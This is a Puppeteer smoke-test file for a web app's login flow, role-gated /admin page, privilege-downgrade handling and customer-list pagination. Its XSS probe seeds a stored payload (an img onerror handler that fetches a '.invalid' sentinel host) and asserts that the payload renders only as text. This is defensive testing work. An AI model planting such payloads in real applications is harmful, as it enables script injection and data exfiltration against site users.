// Headless browser smoke test for /login → / → /admin per role.
// Captures screenshots into test-results/screenshots/ and asserts that:
//   - unauth /admin redirects to /login
//   - viewer/member/manager see the access-denied page on /admin
//   - admin loads /admin successfully without console errors
//   - login form actually works end-to-end (cookie set, redirect to /)
const fs = require('fs');
const path = require('path');
let puppeteer = null;
try { puppeteer = require('puppeteer'); } catch { /* optional */ }

const { BASE, PASSWORD, ROLES, login } = require('./harness');
const { Pool } = require('pg');

function parseCookieKV(jar) {
  // jar is like "connect.sid=s%3A..." (already trimmed by parseSetCookie)
  if (!jar) return null;
  const idx = jar.indexOf('=');
  if (idx < 0) return null;
  return { name: jar.slice(0, idx), value: jar.slice(idx + 1) };
}

const SCREENSHOT_DIR = path.resolve(__dirname, '..', '..', 'test-results', 'screenshots');

async function safeShot(page, file) {
  try {
    await page.screenshot({ path: file, fullPage: true });
  } catch {
    try { await page.screenshot({ path: file }); } catch { /* swallow */ }
  }
}

async function runUiSmoke({ users, runId, clients }) {
  const findings = [];
  function record(name, expected, observed, severity, ok, detail) {
    findings.push({ category: 'ui-smoke', name, expected, observed, severity, ok, detail: detail || '' });
  }

  if (!puppeteer) {
    record('puppeteer available', 'require("puppeteer") resolves',
      'module not installed — npm i -D puppeteer', 'high', false,
      'Install puppeteer and rerun, or pin a system chromium via PUPPETEER_EXECUTABLE_PATH.');
    return findings;
  }
  fs.mkdirSync(SCREENSHOT_DIR, { recursive: true });

  let browser;
  try {
    // Prefer the system chromium (installed via Nix) over puppeteer's bundled
    // download — the latter is missing libglib in this NixOS environment.
    const candidates = [
      process.env.PUPPETEER_EXECUTABLE_PATH,
      '/nix/store/qa9cnw4v5xkxyip6mb9kxqfq1z4x2dx1-chromium-138.0.7204.100/bin/chromium',
    ].filter(Boolean);
    let executablePath;
    for (const p of candidates) {
      try { require('fs').accessSync(p); executablePath = p; break; } catch {}
    }
    if (!executablePath) {
      const { execSync } = require('child_process');
      try { executablePath = execSync('which chromium', { encoding: 'utf8' }).trim() || undefined; } catch {}
    }
    browser = await puppeteer.launch({
      headless: true,
      executablePath,
      defaultViewport: { width: 1280, height: 800 },
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage',
        '--window-size=1280,800'],
    });
  } catch (e) {
    record('headless chromium launches', 'browser.launch() succeeds',
      `error: ${e.message}`, 'high', false,
      'Re-run after `npx puppeteer browsers install chrome` if Chromium is missing.');
    return findings;
  }

  try {
    // Unauth: /admin should bounce to /login
    {
      const page = await browser.newPage();
      await page.setViewport({ width: 1280, height: 800 });
      await page.setCacheEnabled(false);
      const resp = await page.goto(`${BASE}/admin`, { waitUntil: 'domcontentloaded' });
      const finalUrl = page.url();
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-unauth-admin.png`));
      const bouncedToLogin = /\/login(\?|$)/.test(finalUrl) || (resp && resp.status() === 302);
      record('unauth /admin bounces to /login',
        '/login redirect (or 302)', `url=${finalUrl} status=${resp?.status()}`,
        'critical', bouncedToLogin);
      await page.close();
    }

    for (const role of ROLES) {
      const page = await browser.newPage();
      await page.setViewport({ width: 1280, height: 800 });
      await page.setCacheEnabled(false);
      const consoleErrors = [];
      // Turnstile widget errors are an environmental condition of the harness
      // (TURNSTILE_SECRET_KEY is stripped → /api/turnstile-config returns
      // `{ sitekey: null }`, the widget rejects the non-string), not a
      // privilege regression. Drop them from the budget.
      // Filter out environmental noise that doesn't represent a privilege
      // regression: Turnstile widget errors (TURNSTILE_SECRET_KEY stripped by
      // harness), HubSpot/QB 503s (tokens stripped), and the SPA's expected
      // 401/403 responses on /api/admin/* for non-admin roles (the JS
      // *intentionally* tries each admin endpoint and rerenders on denial).
      const ignore = (s) => /Turnstile|turnstile-config|cloudflare|challenges\.cloudflare\.com|status of (401|403|503)|Failed to load resource|HUBSPOT_ACCESS_TOKEN|HUBSPOT_TOKEN|QuickBooks|QB_|Bootstrap failed/i.test(s);
      page.on('console', m => { if (m.type() === 'error' && !ignore(m.text())) consoleErrors.push(m.text()); });
      page.on('pageerror', e => { if (!ignore(e.message)) consoleErrors.push(`pageerror: ${e.message}`); });

      // 1) /login form renders
      await page.goto(`${BASE}/login`, { waitUntil: 'domcontentloaded' });
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-${role}-login.png`));

      // Sign in via a Node-side fetch (harness's makeClient) and inject the
      // resulting session cookie into puppeteer. This sidesteps puppeteer's
      // page-context fetch dropping the Set-Cookie under certain
      // origin/SameSite combinations, while still exercising /api/login.
      const sess = await login(users[role].email, PASSWORD);
      const kv = parseCookieKV(sess.cookie);
      record(`${role} can sign in via /api/login (server-side jar)`,
        'session cookie set', `cookieSet=${!!kv}`,
        'critical', !!kv);
      if (kv) {
        const { hostname } = new URL(BASE);
        await page.setCookie({
          name: kv.name, value: kv.value,
          domain: hostname, path: '/', httpOnly: true,
        });
      }

      // 2) Land on /
      await page.goto(`${BASE}/`, { waitUntil: 'domcontentloaded' });
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-${role}-home.png`));

      // 3) Visit /admin
      const adminResp = await page.goto(`${BASE}/admin`, { waitUntil: 'domcontentloaded' });
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-${role}-admin.png`));
      const adminStatus = adminResp ? adminResp.status() : 0;
      const bodyText = await page.evaluate(() => document.body?.innerText || '');

      // /admin is server-side gated: non-admins get 403, admin gets 200.
      if (role === 'admin') {
        record(`admin /admin returns 200 in the browser`,
          'status=200', `status=${adminStatus}`,
          'critical', adminStatus === 200);
        // The h1 "Admin Panel" exists in static markup; verify via outerHTML
        // (innerText can be empty if the page redirected or set display:none
        // on the body during JS init).
        const finalUrl = page.url();
        const html = await page.content();
        const hasHeading = /Admin Panel/i.test(html);
        record('admin sees the Admin Panel HTML after navigation',
          'page HTML contains "Admin Panel" and URL is /admin',
          `url=${finalUrl} hasHeading=${hasHeading}`,
          'high', hasHeading && /\/admin(\?|#|$)/.test(finalUrl));
      } else {
        record(`${role} /admin returns 403 in the browser`,
          'status=403', `status=${adminStatus}`,
          'critical', adminStatus === 403);
      }

      // 4) Console error budget: zero unexpected errors per role
      record(`${role} loads /admin without browser console errors`,
        'consoleErrors.length === 0',
        `count=${consoleErrors.length} sample=${JSON.stringify(consoleErrors.slice(0, 3))}`,
        'medium', consoleErrors.length === 0);

      await page.close();
    }
    // ── XSS render non-execution (admin UI) ────────────────────────────────
    // Seed a stored XSS payload through the public access-request endpoint,
    // log in as admin in puppeteer, navigate to /admin, and assert:
    //   (a) no pageerror or attacker-controlled fetch fires
    //   (b) the payload is NOT present in any element's outerHTML as raw
    //       script tags (only as HTML-escaped text inside text nodes)
    // The harness covers data round-trip via probes.js; this probe verifies
    // the rendered DOM does not execute the payload.
    try {
      const pool = new Pool({
        connectionString: process.env.DATABASE_URL_TEST || process.env.DATABASE_URL,
      });
      const xssEmail = `privtest-uixss-${runId}@privtest.local`;
      const sentinelHost = `xss-sentinel-${runId}.invalid`;
      const xssPayload = `"><img src=x onerror="window.__xssFired=1;fetch('https://${sentinelHost}/?n=${runId}')">`;
      await pool.query(
        `INSERT INTO account_requests (name, email, status, created_at)
         VALUES ($1, $2, 'pending', NOW())`, [xssPayload, xssEmail]);

      const page = await browser.newPage();
      await page.setViewport({ width: 1280, height: 800 });
      await page.setCacheEnabled(false);
      const errs = [];
      const evilHits = [];
      page.on('pageerror', e => errs.push(e.message));
      page.on('request', req => {
        if (req.url().includes(sentinelHost)) evilHits.push(req.url());
      });

      const sess = await login(users.admin.email, PASSWORD);
      const kv = parseCookieKV(sess.cookie);
      if (kv) {
        const { hostname } = new URL(BASE);
        await page.setCookie({
          name: kv.name, value: kv.value, domain: hostname,
          path: '/', httpOnly: true,
        });
      }
      await page.goto(`${BASE}/admin`, { waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {});
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-xss-render.png`));
      const xssFired = await page.evaluate(() => !!window.__xssFired);
      const html = await page.content();
      // The payload must NOT appear as a raw <img onerror=…> tag in the DOM
      // — only as a text-encoded string inside a cell.
      const rawTagPresent = /<img\s+src=x\s+onerror=/i.test(html);

      record('admin /admin renders the stored XSS payload as text, not script',
        'no pageerror, no fetch to sentinel host, no raw <img onerror> in DOM',
        `pageerrors=${errs.length} sentinelHits=${evilHits.length} xssFired=${xssFired} rawTag=${rawTagPresent}`,
        'critical',
        errs.length === 0 && evilHits.length === 0 && !xssFired && !rawTagPresent);
      await page.close();
      await pool.query(`DELETE FROM account_requests WHERE email = $1`, [xssEmail]);
      await pool.end();
    } catch (e) {
      record('XSS render non-execution probe ran', 'no error',
        `error: ${e.message}`, 'medium', false);
    }

    // ── Privilege downgrade UI staleness (Puppeteer, from already-open page) ─
    // Open /admin as the manager, then have admin demote them to viewer via a
    // separate session, then trigger an admin-only API call from the manager's
    // already-loaded page. The fetch must return 401/403 — proving the gate
    // re-reads role on every request rather than trusting the page's stale
    // session cookie. This is the UI-level analogue of the API downgrade
    // probe in probes.js.
    try {
      const pool = new Pool({
        connectionString: process.env.DATABASE_URL_TEST || process.env.DATABASE_URL,
      });
      const page = await browser.newPage();
      await page.setViewport({ width: 1280, height: 800 });
      await page.setCacheEnabled(false);
      const mgrSess = await login(users.manager.email, PASSWORD);
      const kv = parseCookieKV(mgrSess.cookie);
      const { hostname } = new URL(BASE);
      if (kv) {
        await page.setCookie({
          name: kv.name, value: kv.value, domain: hostname,
          path: '/', httpOnly: true,
        });
      }
      // Manager hits a manager-only API to confirm baseline access.
      await page.goto(`${BASE}/`, { waitUntil: 'domcontentloaded' });
      const before = await page.evaluate(async (base) => {
        const r = await fetch(`${base}/api/trades`, { credentials: 'include' });
        return r.status;
      }, BASE);

      // Now demote via the admin's session (out-of-band).
      const adminSess = await login(users.admin.email, PASSWORD);
      await adminSess.patch(`/api/users/${users.manager.id}/profile`,
        { privilege_level: 'viewer' });

      // From the *same* already-loaded page, fire the same API call again.
      const after = await page.evaluate(async (base) => {
        const r = await fetch(`${base}/api/trades`, { credentials: 'include' });
        return r.status;
      }, BASE);
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-downgrade-ui.png`));

      record('demoted manager loses access from an already-open page (UI staleness)',
        'before=200 (manager) → after in {401,403} (viewer)',
        `before=${before} after=${after}`,
        'critical', before === 200 && (after === 401 || after === 403));

      // Restore the manager
      await adminSess.patch(`/api/users/${users.manager.id}/profile`,
        { privilege_level: 'manager' });
      await page.close();
      await pool.end();
    } catch (e) {
      record('privilege downgrade UI staleness probe ran', 'no error',
        `error: ${e.message}`, 'medium', false);
    }

    // ── Customer list pagination UI smoke ──────────────────────────────────
    // Intercept /api/contacts-all at the Puppeteer level and return 26
    // synthetic contacts (one more than PAGE_SIZE=25) so we can:
    //   (a) verify the pagination bar renders when contacts > 25
    //   (b) click Next to reach page 2
    //   (c) click a contact card → /customers/:id
    //   (d) navigate back to /customers and confirm sessionStorage restored page 2
    try {
      const page = await browser.newPage();
      await page.setViewport({ width: 1280, height: 800 });
      await page.setCacheEnabled(false);

      const memberSess = await login(users.member.email, PASSWORD);
      const kv = parseCookieKV(memberSess.cookie);
      if (kv) {
        const { hostname } = new URL(BASE);
        await page.setCookie({
          name: kv.name, value: kv.value,
          domain: hostname, path: '/', httpOnly: true,
        });
      }

      const syntheticContacts = Array.from({ length: 26 }, (_, i) => ({
        id: `pag-test-${i + 1}`,
        properties: {
          firstname: 'Page',
          lastname: `Test${String(i + 1).padStart(2, '0')}`,
          email: `pagtest${i + 1}@privtest.local`,
          phone: '',
          hs_lead_status: 'OPEN_DEAL',
          city: '',
          customer_number: `PT-${String(i + 1).padStart(2, '0')}`,
          createdate: new Date(Date.now() - i * 1000).toISOString(),
          closedate: null,
          lastmodifieddate: new Date().toISOString(),
        },
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        archived: false,
      }));
      const mockPayload  = JSON.stringify({ results: syntheticContacts, total: 26 });
      const emptyPayload = JSON.stringify({ results: [], total: 0 });

      await page.setRequestInterception(true);
      page.on('request', req => {
        const u = req.url();
        if (u.includes('/api/contacts-all')) {
          req.respond({ status: 200, contentType: 'application/json', body: mockPayload });
        } else if (u.includes('/api/open-leads')) {
          req.respond({ status: 200, contentType: 'application/json', body: emptyPayload });
        } else {
          req.continue();
        }
      });

      await page.goto(`${BASE}/customers`, { waitUntil: 'domcontentloaded' });

      // (a) pagination bar appears when contacts > 25
      const paginationEl = await page.waitForSelector('.cl-pagination', { timeout: 8000 }).catch(() => null);
      record('pagination bar appears when contacts > 25',
        '.cl-pagination element visible in DOM',
        `found=${!!paginationEl}`,
        'medium', !!paginationEl);

      let page2InfoText = '';
      let onDetailPage = false;
      let restoredInfoText = '';

      if (paginationEl) {
        const infoText = await page.$eval('.cl-pagination-info', el => el.textContent).catch(() => '');
        record('pagination info shows correct total on page 1',
          'text contains "of 26"',
          `text="${infoText}"`,
          'medium', infoText.includes('of 26'));

        // (b) click Next → page 2 (the 26th contact)
        await page.click('#cl-next-btn');
        await page.waitForFunction(() => {
          const info = document.querySelector('.cl-pagination-info');
          return info && info.textContent.includes('26');
        }, { timeout: 5000 }).catch(() => {});

        page2InfoText = await page.$eval('.cl-pagination-info', el => el.textContent).catch(() => '');
        record('pagination advances to page 2 on Next click',
          'info text contains "Showing 26" (the 26th item)',
          `text="${page2InfoText}"`,
          'medium', /Showing 26/.test(page2InfoText));

        // (c) click the contact card on page 2 — goToCustomer saves sessionStorage
        //     and navigates to /customers/:id
        const contactCard = await page.$('[data-contact-id]');
        if (contactCard) {
          await Promise.all([
            page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 8000 }),
            contactCard.click(),
          ]).catch(() => {});

          const detailUrl = page.url();
          onDetailPage = /\/customers\//.test(detailUrl);
          record('clicking a contact on page 2 navigates to /customers/:id',
            'url matches /customers/<id>',
            `url=${detailUrl}`,
            'medium', onDetailPage);

          // (d) navigate back to the list — restoreCustomerListFilters() should
          //     re-apply currentPage=2 from sessionStorage
          await page.goto(`${BASE}/customers`, { waitUntil: 'domcontentloaded' });
          await page.waitForFunction(() => {
            const info = document.querySelector('.cl-pagination-info');
            return info && info.textContent.includes('26');
          }, { timeout: 8000 }).catch(() => {});

          restoredInfoText = await page.$eval('.cl-pagination-info', el => el.textContent).catch(() => '');
          record('returning to /customers restores page 2 from sessionStorage',
            'pagination info still shows "Showing 26" after back-navigation',
            `text="${restoredInfoText}"`,
            'medium', /Showing 26/.test(restoredInfoText));
        }
      }

      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-pagination-smoke.png`));
      await page.close();
    } catch (e) {
      record('customer list pagination smoke probe ran', 'no error',
        `error: ${e.message}`, 'medium', false);
    }
  } finally {
    await browser.close().catch(() => {});
  }

  return findings;
}

module.exports = { runUiSmoke, SCREENSHOT_DIR };
